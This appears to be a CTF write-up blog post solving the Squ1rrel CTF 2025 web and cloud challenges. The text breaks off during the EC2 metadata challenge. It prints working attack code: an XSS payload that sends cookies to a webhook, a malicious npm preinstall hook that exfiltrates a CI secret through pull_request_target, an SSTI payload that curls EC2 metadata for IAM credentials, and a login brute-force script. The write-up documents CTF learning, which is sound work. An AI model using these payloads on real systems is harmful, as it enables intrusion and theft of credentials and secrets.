---
title: Squ1rrel CTF 2025 - WEB
date: 2025-04-08
tags: [ctf, web, cloud]
categories: [CTF Writeups]
author: 2Fa0n
img_path: /assets/img/squ1rrel-ctf_2025
image: /assets/img/squ1rrel-ctf_2025/squ1rrel_banner.png
---

# Web
## acorn clicker
**Solvers:** 382 <br>
**Author:** 2Fa0n

### Description
Click acorns. Buy squirrels. Profit. <br>
![acorn clicker](/assets/img/squ1rrel-ctf_2025/acorn_clicker.png)

### Solution
Let create an account and login.
```
username: test_squirrels
password: test_squirrels
```
![login](/assets/img/squ1rrel-ctf_2025/login.png)

You can see that this endpoint `/market` show:
- Your Ballance
- 3 type of squirrels market:
    - Normal Squirrel costs 50 acorns
    - Golden Squirrel costs 100 acorns
    - Flag Squirrel costs 999999999999999999 acorns

When you click on the acorn icon, you will get a random amount of acorns. <br>
![acorn clicker](/assets/img/squ1rrel-ctf_2025/clicker.png)

Output goal is to buy the **Flag Squirrel** and get the flag.

Let click on the acorn icon again but this time we will use Burp Suite to watch the request. <br>
![acorn clicker](/assets/img/squ1rrel-ctf_2025/clicker_request.png)

We can see that there is an request `/api/click` that return a random amount of acorns.
```json
{
    "amount": 6
}
```

What if we change this amount to over Flag Squirrel price?
```json
{
    "amount": 999999999999999999
}
```

![acorn clicker](/assets/img/squ1rrel-ctf_2025/amount_change.png)

The response give **Invalid amount** and the amount is not changed.
Let read the source code from the challenge provider.

![source code](/assets/img/squ1rrel-ctf_2025/source_code.png)

We look through the all the source code and find this code handle the `/api/click` request.
```python
app.post("/api/click", authenticate, async (req, res) => {
  // increase user balance
  const { username } = req.user;
  const { amount } = req.body;

  if (typeof amount !== "number") {
    return res.status(400).send("Invalid amount");
  }

  if (amount > 10) {
    return res.status(400).send("Invalid amount");
  }

  let bigIntAmount;

  try {
    bigIntAmount = BigInt(amount);
  } catch (err) {
    return res.status(400).send("Invalid amount");
  }

  await db
    .collection("accounts")
    .updateOne({ username }, { $inc: { balance: bigIntAmount } });

  res.json({ earned: amount });
});
```

Hmm, also this application use mongodb, and is use mongodb version 6.13.0. <br>
Let search current vulnerability on this version.

```json
{
  "name": "acorn-clicker",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
    "basic-auth": "^2.0.1",
    "bcryptjs": "^3.0.2",
    "bson": "6.10.2",
    "express": "^4.21.2",
    "jsonwebtoken": "^9.0.2",
    "mongodb": "6.13.0"
  },
  "overrides": {
    "mongodb": {
      "bson": "6.10.2"
    }
  }
}
```

We found this one [NODE-6764](https://jira.mongodb.org/browse/NODE-6764) and [node-mongodb-native](https://github.com/mongodb/node-mongodb-native/releases/)

Let try negative number to see if it will work.
```json
{
    "amount": -999999999999999999
}
```

![acorn clicker](/assets/img/squ1rrel-ctf_2025/negative_amount.png)

It response back with **-1000000000000000000** and then refresh the page.

![acorn clicker](/assets/img/squ1rrel-ctf_2025/refresh_page.png)

We get **17446744073709551680** acorns. <br>
Now we can successfully buy the **Flag Squirrel** and get the flag.

![acorn clicker](/assets/img/squ1rrel-ctf_2025/flag_squirrel.png)

**Flag:** `squ1rrel{1nc0rr3ct_d3s3r1al1zat10n?_1n_MY_m0ng0?}`

## emojicrypt
**Solvers:** 161 <br>
**Author:** 2Fa0n

### Description
Passwords can be more secure. We’re taking the first step. <br>
![emojicrypt](/assets/img/squ1rrel-ctf_2025/emojicrypt.png)

### Solution
When we look through, we can see that the register form have `email address` and `username` field. But the login form have `username` and `password` field. <br>
From that, we can assume that we need to cracked the password to login successfully. <br>

Challenge provider give us two file: `index.html` and `app.py`. <br>
Let go through the `app.py` file.
```python
from flask import Flask, request, redirect, url_for, g
import sqlite3
import bcrypt
import random
import os
from dotenv import load_dotenv
load_dotenv()

app = Flask(__name__, static_folder='templates')
DATABASE = 'users.db'
EMOJIS = ['🌀', '🌁', '🌂', '🌐', '🌱', '🍀', '🍁', '🍂', '🍄', '🍅', '🎁', '🎒', '🎓', '🎵', '😀', '😁', '😂', '😕', '😶', '😩', '😗']
NUMBERS = '0123456789'
database = None

def get_db():
    global database
    if database is None:
        database = sqlite3.connect(DATABASE)
        init_db()
    return database

def generate_salt():
    return 'aa'.join(random.choices(EMOJIS, k=12))

def init_db():
    with app.app_context():
        db = get_db()
        cursor = db.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            salt TEXT NOT NULL
        )''')
        db.commit()

@app.route('/register', methods=['POST'])
def register():
    email = request.form.get('email')
    username = request.form.get('username')

    if not email or not username:
        return "Missing email or username", 400
    salt = generate_salt()
    random_password = ''.join(random.choice(NUMBERS) for _ in range(32))
    password_hash = bcrypt.hashpw((salt + random_password).encode("utf-8"), bcrypt.gensalt()).decode('utf-8')

    # TODO: email the password to the user. oopsies!

    db = get_db()
    cursor = db.cursor()
    try:
        cursor.execute("INSERT INTO users (email, username, password_hash, salt) VALUES (?, ?, ?, ?)", (email, username, password_hash, salt))
        db.commit()
    except sqlite3.IntegrityError as e:
        print(e)
        return "Email or username already exists", 400

    return redirect(url_for('index', registered='true'))

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return "Missing username or password", 400
    
    db = get_db()
    cursor = db.cursor()
    cursor.execute("SELECT salt, password_hash FROM users WHERE username = ?", (username,))
    data = cursor.fetchone()
    if data is None:
        return redirect(url_for('index', incorrect='true'))
    
    salt, hash = data
    
    if salt and hash and bcrypt.checkpw((salt + password).encode("utf-8"), hash.encode("utf-8")):
        return os.environ.get("FLAG")
    else:
        return redirect(url_for('index', incorrect='true'))

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

if __name__ == '__main__':
    app.run(port=8000)
```

Notice the password generate function.
```python
salt = generate_salt()
random_password = ''.join(random.choice(NUMBERS) for _ in range(32))
password_hash = bcrypt.hashpw((salt + random_password).encode("utf-8"), bcrypt.gensalt()).decode('utf-8')
```
`password_hash` will hash from `salt + random_password` where `salt` is generated from `generate_salt` (arrange 12 emoji, separated by 'aa') and `random_password` is generated from randomly taking 32 digits together. <br>

According to the bcrypt library [bcrypt](https://github.com/pyca/bcrypt/), bcrypt supports up to 72 characters, so the clue could be that the salt takes up too many characters, making the password meaningless. <br>

![bcrypt](/assets/img/squ1rrel-ctf_2025/bcrypt.png)

Indeed, `salt` has 12 emoji + 11 * 'aa' = 34 characters and then encode('utf-8') to 68 characters <br>
So the password is only given 72 - 68 = 4 characters but in fact 2 characters for encoding <br>
So we just need to scan the password from 00 to 99 is enough <br>

Let create a script to brute force the password.
```python
import requests

url = 'http://52.188.82.43:8060/login'

headers = {
    'Cache-Control': 'max-age=0',
    'Accept-Language': 'en-US,en;q=0.9',
    'Origin': 'http://52.188.82.43:8060',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://52.188.82.43:8060/?registered=true',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
}

def scanpw():
    username = 'test123123123test'
    
    patterns = [
        "0" * 32,
        "1" * 32,
        "12345678901234567890123456789012",
    ]
    
    for pattern in patterns:
        data = {
            'username': username,
            'password': pattern
        }
        print(f"Trying pattern: {pattern[:5]}...")
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
        
        if response.status_code != 302 or 'incorrect' not in response.headers.get('Location', ''):
            print('Success! Password:', pattern)
            print('Response:', response.text)
            return
    
    print("Trying number combinations...")
    for i in range(100):
        passwd = str(i).zfill(2) * 16
        data = {
            'username': username,
            'password': passwd
        }
        
        print(f"Trying: {passwd[:5]}...")
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
        
        if response.status_code != 302 or 'incorrect' not in response.headers.get('Location', ''):
            print('Success! Password:', passwd)
            print('Response:', response.text)
            return
        
    print("Password not found")

if __name__ == "__main__":
    print("Starting password scan...")
    scanpw()
```

```text
➜  emojicrypt python3 script.py
Starting password scan...
Trying pattern: 00000...
Trying pattern: 11111...
Trying pattern: 12345...
Trying number combinations...
Trying: 00000...
Trying: 01010...
Trying: 02020...
Trying: 03030...
Trying: 04040...
Trying: 05050...
Trying: 06060...
Trying: 07070...
Trying: 08080...
Trying: 09090...
Trying: 10101...
Trying: 11111...
Trying: 12121...
Trying: 13131...
Trying: 14141...
Trying: 15151...
Trying: 16161...
Trying: 17171...
Trying: 18181...
Trying: 19191...
Trying: 20202...
Trying: 21212...
Trying: 22222...
Trying: 23232...
Trying: 24242...
Trying: 25252...
Trying: 26262...
Trying: 27272...
Trying: 28282...
Trying: 29292...
Trying: 30303...
Trying: 31313...
Trying: 32323...
Trying: 33333...
Trying: 34343...
Trying: 35353...
Trying: 36363...
Trying: 37373...
Success! Password: 37373737373737373737373737373737
Response: squ1rrel{turns_out_the_emojis_werent_that_useful_after_all}
```

After run the script, we get the password: `37373737373737373737373737373737` <br> and login successfully to get the flag.

**Flag:** `squ1rrel{turns_out_the_emojis_werent_that_useful_after_all}`

## go getter
**Solvers:** 107 <br>
**Author:** 2Fa0n

### Description
There's a joke to be made here about Python eating the GOpher. I'll cook on it and get back to you. <br>
![go getter](/assets/img/squ1rrel-ctf_2025/go_getter.png)

### Solution
Let go through the website. <br>
We choose the `Get GOpher` action and see what happen. <br>
![go getter](/assets/img/squ1rrel-ctf_2025/get_gopher.png)

It show the title with image, what about `I don't care about gophers, I want the flag >:)` action? <br>
![go getter](/assets/img/squ1rrel-ctf_2025/get_flag.png)

We get the `Access Denied` message and that want suppose to be :)). <br>
Let watch these action again with Burp Suite. <br>
![go getter](/assets/img/squ1rrel-ctf_2025/get_gopher_request.png)
![go getter](/assets/img/squ1rrel-ctf_2025/get_flag_request.png)

Let go through the source code. <br>
![go getter](/assets/img/squ1rrel-ctf_2025/source_code_go_getter.png)

We find the function handle the `/execute` endpoint in `main.go` file. <br>
```go
// Handler for executing actions
func executeHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	// Read JSON body
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read request body", http.StatusBadRequest)
		return
	}

	// Parse JSON
	var requestData RequestData
	if err := json.Unmarshal(body, &requestData); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Process action
	switch requestData.Action {
	case "getgopher":
		resp, err := http.Post("http://python-service:8081/execute", "application/json", bytes.NewBuffer(body))
		if err != nil {
			log.Printf("Failed to reach Python API: %v", err)
			http.Error(w, "Failed to reach Python API", http.StatusInternalServerError)
			return
		}
		defer resp.Body.Close()

		// Forward response from Python API back to the client
		responseBody, _ := io.ReadAll(resp.Body)
		w.WriteHeader(resp.StatusCode)
		w.Write(responseBody)
	case "getflag":
		w.Write([]byte("Access denied: You are not an admin."))
	default:
		http.Error(w, "Invalid action", http.StatusBadRequest)
	}
}
```

I personally do not know much abou Go so I look other file handle this part in `app.py` file. <br>
```python
@app.route('/execute', methods=['POST'])
def execute():
    # Ensure request has JSON
    if not request.is_json:
        return jsonify({"error": "Invalid JSON"}), 400

    data = request.get_json()
    
    # Check if action key exists
    if 'action' not in data:
        return jsonify({"error": "Missing 'action' key"}), 400

    # Process action
    if data['action'] == "getgopher":
        # choose random gopher
        gopher = random.choice(GO_HAMSTER_IMAGES)
        return jsonify(gopher)
    elif data['action'] == "getflag":
        return jsonify({"flag": os.getenv("FLAG")})
    else:
        return jsonify({"error": "Invalid action"}), 400
```

We can see that the if condition is check the `action` key in the request body. So what if we add another action after `getgopher`? <br>
```json
{
    "action": "getflag",
    "action": "getgopher"
}
```

Let try and see what happen. <br>
![go getter](/assets/img/squ1rrel-ctf_2025/get_flag_request_2.png)

Only get title and image. Hmm, look closely to the Process action, it only check word `action`, whatif capitalize some letter in `action`? <br>
```json
{
    "action": "getflag",
    "Action": "getgopher"
}
```

![go getter](/assets/img/squ1rrel-ctf_2025/get_flag_request_3.png)

We get the flag. <br>

**Flag:** `squ1rrel{p4rs3r?_1_h4rd1y_kn0w_3r!}`

## funkytype
**Solvers:** 95 <br>
**Author:** 2Fa0n

### Description
our washed alum has been trying to improve his vocabulary and type really fast at the same time! <br>
https://funkytype.squ1rrel.dev/ <br>
![funkytype](/assets/img/squ1rrel-ctf_2025/funkytype.png)

### Solution
Let try this application first to see if I can type fast to get the flag. <br>
![funkytype](/assets/img/squ1rrel-ctf_2025/funkytype_1.png)

That was pretty slow :)) but nevermind, let do go through with Burp Suite. <br>
We can see there are 2 request, one for get the challenge and one for typing to see the result. <br>
![funkytype](/assets/img/squ1rrel-ctf_2025/funkytype_2.png)
![funkytype](/assets/img/squ1rrel-ctf_2025/funkytype_3.png)

So in order to get the flag, we must have 500 wpm and 100% accuracy and also filled in the missing word. <br>
Whatif we copy the text from challenge to chatgpt to help us filled in the missing word in _ place and enter to the request within 30 seconds, will it work? <br>

To make it easier, let create a script to do that. <br>
```python
import requests
import json

url = "https://funkytype.squ1rrel.dev/"
headers_initial = {
    "Next-Action": "000212f913f84a9e1f0c301a65968550d57a97626c",
    "Sec-Ch-Ua-Platform": '"macOS"',
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Accept": "text/x-component",
    "Content-Type": "text/plain;charset=UTF-8",
    "Origin": "https://funkytype.squ1rrel.dev",
    "Referer": "https://funkytype.squ1rrel.dev/",
}

# Get challenge
response = requests.post(url, headers=headers_initial, data="[]")
parts = response.text.splitlines()

parsed_data = {}
for part in parts:
    index, json_str = part.split(":", 1)
    parsed_data[index] = json.loads(json_str)

displayText = parsed_data["1"]["displayText"]
challId = parsed_data["1"]["id"]
print(f"{len(displayText.split(' '))} words challenge:")
print(displayText)

# Input filled-in result
filled_in = input("Typed Text: ").strip()

data_submit = [{
    "challengeId": challId,
    "typedText": filled_in,
    "wpm": 500,
    "accuracy": 100,
    "timeMs": 3600
}]

headers_submit = headers_initial.copy()
headers_submit["Next-Action"] = "409727ad706c059b481852c0227079fc36d914e18b"

response = requests.post(url, headers=headers_submit, json=data_submit)

print("Server Response:")
print(response.text)
```

So when we run the script, it will give us the challenge, we will immediately copy to chatgpt and help us filled in the missing word and then enter results to continue the script. <br>
```text
➜  funkytype python3 script.py
30 words challenge:
n_uroplast_city congratul_tions unfor_un_tely h_n_ri_icabilitudinitatibus au__entication hepa_icocholangio_as_rost_my confiden_iality opportun_ties cyb_rse_urity p_eumono_ltramicroscopicsilicovolc___conio_is supercalifragili_tice_pialidoci_us con_id_rable in_rastruct_ral t_l_communications smil_s simult_neo_sly commu_ication part_cularly pseu_o_seudo_ypopa_athy_oidism incom_rehensibili_i_s ps_choneuroendocrinolo_ical prof_ssional indepe_dently respo_sibili_y thyroparathy__idectomi__d c_unterre_olutiona_ies swagg_r accessib_li_y u_characteristical_y incompre_e_si_leness
Typed Text: neuroplasticity congratulations unfortunately honorificabilitudinitatibus authentication hepaticocholangiogastrostomy confidentiality opportunities cybersecurity pneumonoultramicroscopicsilicovolcanoconiosis supercalifragilisticexpialidocious considerable infrastructural telecommunications smiles simultaneously communication particularly pseudopseudohypoparathyroidism incomprehensibilities psychoneuroendocrinological professional independently responsibility thyroparathyroidectomized counterrevolutionaries swagger accessibility uncharacteristically incomprehensibleness
Server Response:
0:{"a":"$@1","f":"","b":"pYBQmDX3AX7Yt4mJpGjSs"}
1:{"success":true,"flag":"squ1rrel{guessable}"}
```

We successfully get the flag. <br>

**Flag:** `squ1rrel{guessable}`

## portrait
**Solvers:** 40 <br>
**Author:** 2Fa0n

### Description
It's like DeviantArt, but with a report button to keep it less Deviant. Reporting a gallery will make the admin bot visit it. <br>
![portrait](/assets/img/squ1rrel-ctf_2025/portrait.png)

### Solution
Let register an account and login. <br>
```text
username: test_portrait
password: test_portrait
```
![portrait](/assets/img/squ1rrel-ctf_2025/login_portrait.png)

A quick look we can add a portrait to the gallery. Let try. <br>

![portrait](/assets/img/squ1rrel-ctf_2025/add_portrait.png)

We have success add a portrait with mountain picture and title `naruto`. <br>
Let try the `Report a portrait` button. <br>
![portrait](/assets/img/squ1rrel-ctf_2025/report_portrait.png)

See that this page is where the admin bot visit when we report a portrait. <br>
Let try this url `http://52.188.82.43:8070/gallery?username=test_portrait#` and see what happen. <br>
![portrait](/assets/img/squ1rrel-ctf_2025/admin_bot.png)

Like what we expected, the admin will visit this url. Hmm so maybe this case can be an XSS to get the admin cookie. <br>
Let look over the source code from challenge provider. <br>
![portrait](/assets/img/squ1rrel-ctf_2025/source_code_portrait.png)

Audit look the source code, we can see some code in the `challenge/bot/bot.js` file handle the admin bot visit the url has disabled xss auditor. <br>
```js
const browserArgs = {
    headless: (() => {
        const is_x11_exists = fs.existsSync('/tmp/.X11-unix');
        if (process.env['DISPLAY'] !== undefined && is_x11_exists) {
            return false;
        }
        return true;
    })(),
    args: [
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--no-gpu',
        '--disable-default-apps',
        '--disable-translate',
        '--disable-device-discovery-notifications',
        '--disable-software-rasterizer',
        '--disable-xss-auditor',
        ...(() => {
            if (CONFIG.APPEXTENSIONS === "") return [];
            return [
                `--disable-extensions-except=${CONFIG.APPEXTENSIONS}`,
                `--load-extension=${CONFIG.APPEXTENSIONS}`
            ];
        })(),
    ],
    ignoreHTTPSErrors: true
};
```

Which is pretty clear that this must be an XSS case, let go through further more. <br>
We found lib that handle the url for the admin bot visit. <br>
```js
<body data-bs-theme="dark">
    <div class="vh-100 container d-flex flex-column justify-content-center align-items-center">
        <h1>
            <%= name %>'s Bot Page
        </h1>
        <form id="visit-form" class="d-flex flex-column w-50">
            <div class="mb-3">
                <label for="url" class="form-label">Enter note URL:</label>
                <input type="text" name="url" id="url" class="form-control" required>
            </div>
            <input type="submit" value="Visit Note" class="btn btn-primary mb-3">
            <div class="text-center alert-danger alert-dismissible fade show w-100" id="error-message"></div>
            <div class="text-center alert-success alert-dismissible fade show w-100" id="success-message"></div>
        </form>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"
        integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script>
        $(document).ready(function () {
            const form = $('#visit-form');
            const successMessage = $('#success-message');
            const errorMessage = $('#error-message');
            const loadingAnimation = $('<div class="loading"></div>');

            form.submit(function (event) {
                event.preventDefault();
                const url = $('#url').val();
                successMessage.slideUp()
                errorMessage.slideUp()
                form.append(loadingAnimation);
                $.ajax({
                    type: 'POST',
                    url: '',
                    data: { url: url },
                    success: function (data) {
                        form.find('.loading').remove();
                        if (data.success) {
                            successMessage.text(data.success).addClass("alert").slideDown();
                        } else {
                            errorMessage.text(data.error).addClass("alert").slideDown();
                        }
                    },
                    error: (jq, status) => {
                        form.find('.loading').remove();
                        if (response = jq.responseJSON) {
                            errorMessage.text(response.error).addClass("alert").slideDown();
                        } else {
                            errorMessage.text('An error occurred while processing the request.').addClass("alert").slideDown();
                        }
                    },
                });
            });
        });
    </script>
</body>
```

Let discover if there is any CVE or public exploit for `jquery` library. <br>
```js
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"
```

We found a [CVE-2015-9251](https://www.cvedetails.com/cve/CVE-2015-9251/) that is related to `jquery` library. And also from [Github Issue](https://github.com/postfixadmin/postfixadmin/issues/734). Let find some POCs to understand more and exploit this challenge. <br>

I found this [POC](https://github.com/hackgiver/CVE-2015-9251), let try it out. <br>
```python
from http.server import SimpleHTTPRequestHandler, HTTPServer

class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/malicious.js":
            self.send_response(200)
            self.send_header('Content-Type', 'text/javascript')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Headers', 'x-requested-with')
            self.send_header('Access-Control-Allow-Credentials', 'true')
            self.send_header('X-Content-Type-Options', 'nosniff')
            self.end_headers()
            self.wfile.write(b"fetch('https://webhook.site/58141f9b-d36d-46d9-b8b0-c782317584f3/?flag='+document.cookie)")
        else:
            self.send_response(404)
            self.end_headers()

server_address = ('', 8081) 
httpd = HTTPServer(server_address, CustomHandler)
print("The malicious server starts at http://localhost:8081")
httpd.serve_forever()
```

But when I run the script and inject `http://localhost:8081/malicious.js`, it still work but when I check the webhook response, it does not get any response back. <br>
Let try to `view-source` the page to figure out what happen. <br>
```js
<script>
            $(document).ready(function () {
                const username = new URLSearchParams(window.location.search).get("username");
                $.ajax({
                    url: "/api/portraits/" + username,
                    type: "GET",
                    success: function (data) {
                        data.forEach((portrait) => {
                            const col = $("<div>").addClass("col-md-4 mb-4");
                            const card = $("<div>").addClass("card shadow-sm");
                            const img = $("<img>").addClass("card-img-top").attr("src", portrait.source).attr("alt", portrait.name);
                            const cardBody = $("<div>").addClass("card-body text-center");
                            const title = $("<h5>").addClass("card-title").text(portrait.name);

                            img.on("error", (e) => {
                                $.get(e.currentTarget.src).fail((response) => {
                                    if (response.status === 403) {
                                        $(e.target).attr("src", "https://cdn.pixabay.com/photo/2021/08/03/06/14/lock-6518557_1280.png");
                                    } else {
                                        $(e.target).attr(
                                            "src",
                                            "https://cdn.pixabay.com/photo/2024/02/12/16/05/siguniang-mountain-8568913_1280.jpg"
                                        );
                                    }
                                });
                            });

                            cardBody.append(title);
                            card.append(img).append(cardBody);
                            col.append(card);
                            $("#portraitsContainer").append(col);
                        });
                    },
                });

                $("#addPortraitForm").submit(function (event) {
                    const token = localStorage.getItem("token");
                    event.preventDefault();
                    const title = $("#portraitTitle").val();
                    const source = $("#portraitSource").val();

                    $.ajax({
                        url: "/api/portraits",
                        type: "POST",
                        dataType: "json",
                        headers: {
                            "Content-Type": "application/json",
                            Authorization: "Bearer " + token,
                        },
                        data: JSON.stringify({ name: title, source: source }),
                        success: function () {
                            console.log("posted");
                            location.reload();
                        },
                    });
                });

                $(".btn-outline-light").click(function () {
                    localStorage.removeItem("token");
                    window.location.href = "/";
                });

                $(".btn-danger").click(function () {
                    window.location.href = "/report";
                });
            });
        </script>
```

This is where jquery modify the data URI and error handling. <br>
```js
const img = $("<img>").addClass("card-img-top").attr("src", portrait.source).attr("alt", portrait.name);
```
When a portrait is created, it will have tag `<img>` with source from `portrait.source`. After that there is a error handler for tag `<img>`. <br>
```js
img.on("error", (e) => {
    $.get(e.currentTarget.src).fail((response) => {
        if (response.status === 403) {
            $(e.target).attr("src", "https://cdn.pixabay.com/photo/2021/08/03/06/14/lock-6518557_1280.png");
        } else {
            $(e.target).attr("src", "https://cdn.pixabay.com/photo/2024/02/12/16/05/siguniang-mountain-8568913_1280.jpg");
        }
    });
});
```

So we need to exploit the `portrait.source` but if the image throws error, it will get the direct url and if not, it will get the custom url. <br>
What if we use `data:text/javascript,alert(1)` for the url? <br>

![portrait](/assets/img/squ1rrel-ctf_2025/data_uri.png)

It successfully bypass the error handling and trigger the alert. The reason is that URI schema does not download image from the network and using `data:` can direct inject vào `src` attribute. And `text/javascript` let MIME type, browser will execute content as javascript. <br>

So maybe the CVE may work but I can not exploit with it so I will go with the other way. <br>
- First run the script to host the malicious server.
- First enter `data:text/javascript,fetch('https://webhook.site/YOUR-WEBHOOK-ID/?flag=' + document.cookie)` to url field.
- And then report the url gallery `http://52.188.82.43:8070/gallery?username=test_portrait` to admin.
- Check the webhook response and get the flag.

![portrait](/assets/img/squ1rrel-ctf_2025/create_portrait.png)
![portrait](/assets/img/squ1rrel-ctf_2025/report_portrait2.png)
![portrait](/assets/img/squ1rrel-ctf_2025/webhook_response.png)

**Flag:** `squ1rrel{unc_s747us_jqu3ry_l0wk3y_take_two_new_flag_check_this_out_guys}`

## Cloud
## opensource
**Solvers:** 105 <br>
**Author:** 2Fa0n

### Description
The entirety of this challenge takes place on GitHub. Accept the challenge at https://github.squ1rrel.dev/ (do not attack this website, it is not part of the challenge). <br>
![opensource](/assets/img/squ1rrel-ctf_2025/opensource.png)

### Solution
Let dive into the source code. From the challenge description, they said that **do not attack this website** so maybe we need to exploit the way that to rebuild this repo or something else similar. <br>

After go through, I found this file `/.github/workflows/test.yml` about github workflow. <br>
```yml
name: Test Build

on:
  pull_request_target:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          ref: ${{github.event.pull_request.head.ref}}
          repository: ${{github.event.pull_request.head.repo.full_name}}
          token: ${{ secrets.PAT }}
      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install dependencies
        run: npm install
        env:
          FLAG: ${{ secrets.FLAG }}
      - name: Run build
        run: npm run build
```

I mam curious what is `pull_request_target` about. I search and found this [article](https://stackoverflow.com/questions/74957218/what-is-the-difference-between-pull-request-and-pull-request-target-event-in-git). <br>

From my understanding, `pull_request_target` can access the secret token and have read write permission. And also there is some curious part in this file. <br>
- `ref: ${{github.event.pull_request.head.ref}}` so it checkout the branch from the pull request.
- use PAT to access the repo.
- have the ability to access env FLAG from secret.

So the idea is that we can create a pull request to get this FLAG to our webhook. In order to do that, we need to add 1 more line to `package.json` file. <br>
```json
"scripts": {
  "preinstall": "node .github/scripts/exploit.js"
}
```

And create a new file `/.github/scripts/exploit.js` to get the FLAG. <br>
```js
const https = require('https'); https.get(`https://webhook.site/3e9e2852-23ec-408a-9bed-b6cc7cd9b78c?flag=${encodeURIComponent(process.env.FLAG)}`);

```

After that, we need to `git commit` and `git push` to the repo. And then create a pull request to rebuild the repo. <br>
Then go to the tab `Actions` and check the workflow `Install dependencies` to see the result. <br>

This is the result if we using this script to exploit. <br>
```js
console.log("FLAG FOUND:", process.env.FLAG);
```
![opensource](/assets/img/squ1rrel-ctf_2025/exploit_result.png)

We will see that `FLAG FOUND: ***` due to the Github Actions to protect the secret in the workflow. So that is why we need to bring it out to other place so that we can see what inside the FLAG. <br>

![opensource](/assets/img/squ1rrel-ctf_2025/webhook_response2.png)

Now we can see what inside the FLAG. <br>
`CTF{github_configuration_womp_womp}`

**Flag:** `squ1rrel{github_configuration_womp_womp}`

## metadata
**Solvers:** 48 <br>
**Author:** 2Fa0n

### Description
Just vibe coded my very first website, and my friend put it up on his EC2. No shot it has any security vulnerabilities, right? <br>
![metadata](/assets/img/squ1rrel-ctf_2025/metadata.png)

### Solution
From the challenge description, this page is really basic and may have some vulnerability. But the key is to expose the metadata of the EC2 instance. For more information about metadata, you can visit this [link](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html). <br>

I think that this challenge want us to exploit the SSRF attack but we need to chain from other vulnerability in order to access the metadata instance. <br>

After testing, I found this page vulnerable to `XSS` attack and I go through research, exploit but still not have way to access the metadata instance. <br>

![metadata](/assets/img/squ1rrel-ctf_2025/xss.png)

I try this [link](https://www.ionize.com.au/stealing-amazon-ec2-keys-via-an-xss-vulnerability/) but not luckly to exploit, maybe this blog is too old about 2017 so let try another way. <br>

After a while, I test SSTI Jinja2 and found it vulnerable to it. <br>

![metadata](/assets/img/squ1rrel-ctf_2025/ssti.png)

I found this [hacktricks-ssti-jinja2-rce](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#jinja2-remote-code-execution) and try to exploit it. And from this [hacking-thecloud](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/) blog, I found that we can use `http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2instancerole` to get the `AWS credentials`. <br>
```text
name={{config.__class__.__init__.__globals__['os'].popen('curl+-s+http%3a//169.254.169.254/latest/meta-data/iam/security-credentials/ec2instancerole').read()}}
```

![metadata](/assets/img/squ1rrel-ctf_2025/ssti_result.png)

```json
{
  "Code": "Success",
  "LastUpdated": "2025-04-07T13:48:01Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "[REDACTED]",
  "SecretAccessKey": "[REDACTED]",
  "Token": "[REDACTED]",
  "Expiration": "2025-04-07T20:09:28Z"
}
```

We found the `AccessKeyId` and `SecretAccessKey` and even the `Token`. I found this [link](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html#using-temp-creds-sdk-cli) how to interace with AWS CLI. <br>

- First let export the credentials to environment variables.
```bash
export AWS_ACCESS_KEY_ID="[REDACTED]"
export AWS_SECRET_ACCESS_KEY="[REDACTED]"
export AWS_SESSION_TOKEN="[REDACTED]"
```

- Then we need to check current identity.
```
aws sts get-caller-identity
```
```json
{
    "UserId": "AROAY565SN6N3M5MZ3PPG:i-077237234931c596e",
    "Account": "614108131227",
    "Arn": "arn:aws:sts::614108131227:assumed-role/ec2instancerole/i-077237234931c596e"
}
```

- We need to get role details and it policies attached to it.
```bash
aws iam get-role --role-name ec2instancerole

aws iam list-attached-role-policies --role-name ec2instancerole
```
```json
{
    "Role": {
        "Path": "/",
        "RoleName": "ec2instancerole",
        "RoleId": "AROAY565SN6N3M5MZ3PPG",
        "Arn": "arn:aws:iam::614108131227:role/ec2instancerole",
